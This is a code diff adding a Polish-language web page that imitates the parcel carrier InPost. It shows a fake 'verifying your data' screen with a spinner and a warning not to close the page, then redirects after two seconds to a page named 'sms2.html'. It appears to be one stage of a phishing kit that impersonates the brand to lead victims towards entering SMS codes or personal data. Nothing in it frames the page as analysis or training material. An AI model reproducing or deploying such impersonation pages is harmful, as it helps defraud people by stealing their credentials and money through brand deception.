@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Weryfikacja danych - InPost</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #fff;
+      color: #222;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+      padding: 1rem;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      font-size: 1.75rem;
+      font-weight: 700;
+      margin-bottom: 1.5rem;
+      color: #000;
+      justify-content: center;
+    }
+
+    .logo svg {
+      width: 36px;
+      height: 36px;
+      fill: #ffcc00;
+      margin-right: 0.5rem;
+    }
+
+    h2 {
+      font-size: 1.3rem;
+      margin-bottom: 1rem;
+    }
+
+    p {
+      color: #555;
+      font-size: 1rem;
+      margin-bottom: 2rem;
+    }
+
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #eee;
+      border-top: 5px solid #ffcc00;
+      border-radius: 50%;
+      animation: spin 1.1s linear infinite;
+      margin: 0 auto 2rem;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .note {
+      font-size: 0.85rem;
+      color: #999;
+    }
+  </style>
+  <script>
+    setTimeout(() => {
+      window.location.href = "sms2.html";
+    }, 2000); // redirect after 2 seconds
+  </script>
+</head>
+<body>
+  <div class="logo" aria-label="InPost logo">
+    <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+      <circle cx="12" cy="12" r="5" fill="#FFCC00"/>
+      <g stroke="#FFCC00" stroke-width="2">
+        <line x1="12" y1="1" x2="12" y2="5" />
+        <line x1="12" y1="19" x2="12" y2="23" />
+        <line x1="1" y1="12" x2="5" y2="12" />
+        <line x1="19" y1="12" x2="23" y2="12" />
+        <line x1="4" y1="4" x2="7" y2="7" />
+        <line x1="17" y1="17" x2="20" y2="20" />
+        <line x1="4" y1="20" x2="7" y2="17" />
+        <line x1="17" y1="7" x2="20" y2="4" />
+      </g>
+    </svg>
+    InPost
+  </div>
+
+  <h2>Trwa weryfikacja Twoich danych...</h2>
+  <p>Proszę czekać, to może potrwać chwilę.</p>
+
+  <div class="spinner" role="status" aria-label="Ładowanie"></div>
+
+  <p class="note">Nie zamykaj tej strony, trwa przetwarzanie danych.</p>
+</body>
+</html>
